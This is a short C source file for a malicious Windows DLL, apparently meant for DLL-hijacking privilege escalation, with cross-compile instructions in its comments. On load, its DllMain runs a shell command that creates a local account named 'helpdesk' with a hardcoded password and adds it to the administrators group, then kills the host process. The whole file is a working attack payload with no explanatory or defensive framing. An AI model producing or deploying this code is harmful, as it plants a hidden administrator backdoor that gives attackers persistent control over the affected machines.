// For x64 compile with: x86_64-w64-mingw32-gcc hijackme.c -shared -o hijackme.dll
// For x86 compile with: i686-w64-mingw32-gcc hijackme.c -shared -o hijackme.dll

#include <windows.h>

BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved) {
    if (dwReason == DLL_PROCESS_ATTACH) {
        system("cmd.exe /c net user /add helpdesk L3tm3!n && net localgroup administrators helpdesk /add");
        ExitProcess(0);
    }
    return TRUE;
}
